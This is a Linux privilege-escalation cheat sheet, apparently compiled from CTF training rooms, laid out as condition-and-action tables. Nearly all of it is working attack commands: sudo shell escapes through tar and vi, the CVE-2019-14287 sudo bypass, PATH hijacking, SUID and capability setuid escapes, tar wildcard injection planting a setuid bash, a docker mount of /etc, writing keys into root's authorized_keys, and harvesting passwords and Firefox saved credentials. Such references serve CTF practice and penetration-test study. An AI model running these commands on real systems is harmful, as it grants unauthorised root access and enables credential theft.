
### sudo -l → what can you run?

| Condition | Action |
|-----------|--------|
| **tar** | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`<br>*Ref: Bounty Hacker* |
| **vi / vim** | `sudo vi -c ':!/bin/bash' /dev/null`<br>*Ref: Chocolate Factory* |
| **perl + writable script** | Overwrite the script it calls<br>*Ref: LazyAdmin* |
| **NOPASSWD: ALL** | `sudo bash -i`<br>*Ref: Pickle Rick, Silver Platter* |
| **!root quirk (CVE)** | `sudo -u \#$((0xffffffff)) /bin/bash` — `CVE-2019-14287`<br>*Ref: Agent Sudo* |
| **python3 runs a script** | Drop fake module: `echo 'import os; os.system("/bin/bash")' > random.py`<br>*Ref: Wonderland* |
| **sudo binary → PATH hijack** *(new)* | Binary runs as root via sudo and calls a command without absolute path — same PATH hijack technique but triggered by sudo, not SUID<br>1. `strings /usr/sbin/shutdown` → see it calls `poweroff` without full path<br>2. `echo '/bin/sh' > /tmp/poweroff && chmod +x /tmp/poweroff`<br>3. `export PATH=/tmp:$PATH`<br>4. `sudo /usr/sbin/shutdown` → root shell<br>*Ref: Year of the Fox (shutdown → poweroff)* |

---

### SUID / custom binary?

| Condition | Action |
|-----------|--------|
| **Find them** | `find / -user root -perm /4000 2>/dev/null`<br>Also: `find /usr/bin -group <username>` |
| **nmap** | `nmap --interactive` → `!sh`<br>*Ref: Mr Robot* |
| **python / python2.7** | `python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'`<br>*Ref: RootMe* |
| **PATH hijacking (SUID)** | 1. `strings binary \| awk 'length($0) > 10'` — find relative calls<br>2. Create fake command + `chmod +x`<br>3. `export PATH=/writable/dir:$PATH` then run binary<br>*Ref: Wonderland (teaParty), Archangel (backup)* |
| **xxd (SUID)** | `echo 'ssh-key...' \| xxd \| /opt/xxd -r - /root/.ssh/authorized_keys`<br>*Ref: Cheese CTF* |
| **named binary + version** | Google name + version for public exploit<br>*Ref: Madness (screen-4.5.0)* |

---

### Linux Capabilities?

| Condition | Action |
|-----------|--------|
| **Find them** | `getcap -r / 2>/dev/null` |
| **perl cap_setuid** | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'`<br>*Ref: Wonderland* |
| **python cap_setuid** | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| **Any binary** | Check GTFOBins "Capabilities" → gtfobins.github.io |

---

### Cron jobs / writable scripts?

| Condition | Action |
|-----------|--------|
| **Find running jobs** | `pspy64` or `cat /etc/crontab` |
| **Writable called script** | Append reverse shell, wait for cron<br>*Ref: Startup, Archangel* |
| **systemd timer** | Edit writable .timer, daemon-reload, trigger<br>*Ref: Cheese CTF* |
| **Tar wildcard injection** | 1. `echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh && chmod +x shell.sh`<br>2. `echo "" > "--checkpoint=1"` and `echo "" > "--checkpoint-action=exec=sh shell.sh"`<br>3. Wait → `/tmp/rootbash -p`<br>*Ref: Anonymous Playground* |

---

### Special group membership?

| Condition | Action |
|-----------|--------|
| **docker group** | `docker run -v /etc/:/mnt -it alpine`<br>*Ref: Chillhack* |
| **adm group** | Read /var/log/* — may contain passwords<br>*Ref: Silver Platter* |

---

### Lateral movement / other users?

| Condition | Action |
|-----------|--------|
| **MySQL / phpMyAdmin** | `grep -r "password" /var/www/ 2>/dev/null`<br>*Ref: Chillhack, LazyAdmin, Different CTF* |
| **SSH key found** | `chmod 600 id_rsa && ssh -i id_rsa user@$IP` |
| **Firefox saved creds** | Copy .firefox profile to attacker, open in Lockwise<br>*Ref: Glitch* |
| **grep logs / files** | `grep -iR username /home /var/log 2>/dev/null` |
| **password.txt in home** | Always `ls -la` the new user's home after lateral move<br>*Ref: Wonderland* |
| **Check /opt/ for creds** | `ls /opt/ && cat /opt/*.txt`<br>*Ref: Internal* |
| **Internal service notes** | `ls -a ~/ && cat ~/*.txt`<br>*Ref: Internal* |

